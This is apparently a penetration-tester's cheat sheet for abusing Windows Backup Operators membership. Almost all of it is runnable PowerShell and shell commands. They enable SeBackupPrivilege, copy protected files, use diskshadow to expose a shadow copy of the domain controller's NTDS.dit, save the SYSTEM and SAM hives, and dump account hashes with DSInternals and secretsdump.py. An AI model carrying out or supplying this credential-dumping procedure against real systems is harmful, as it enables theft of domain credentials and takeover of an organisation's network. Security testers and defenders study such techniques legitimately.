# Windows Built-In Groups

## Approach to Exploiting Windows Built-in Groups (Backup Operators)

## Identify Group Memberships

```powershell
whoami /groups
```

## Verify SeBackupPrivilege

```powershell
whoami /priv
Get-SeBackupPrivilege
```

## Enable SeBackupPrivilege

```powershell
Set-SeBackupPrivilege
```

## Import Required Modules

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

## Access Protected Files

```powershell
dir <protected_directory>
Copy-FileSeBackupPrivilege <protected_file> <destination>
robocopy /B <source> <destination> <file>
```

## Target Domain Controller (NTDS.dit)

```powershell
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit <destination>
robocopy /B E:\Windows\NTDS\ <destination> ntds.dit
```

## Backup Registry Hives

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

## Extract Credentials (NTDS.dit)

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName <DN> -DBPath .\ntds.dit -BootKey $key
```

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
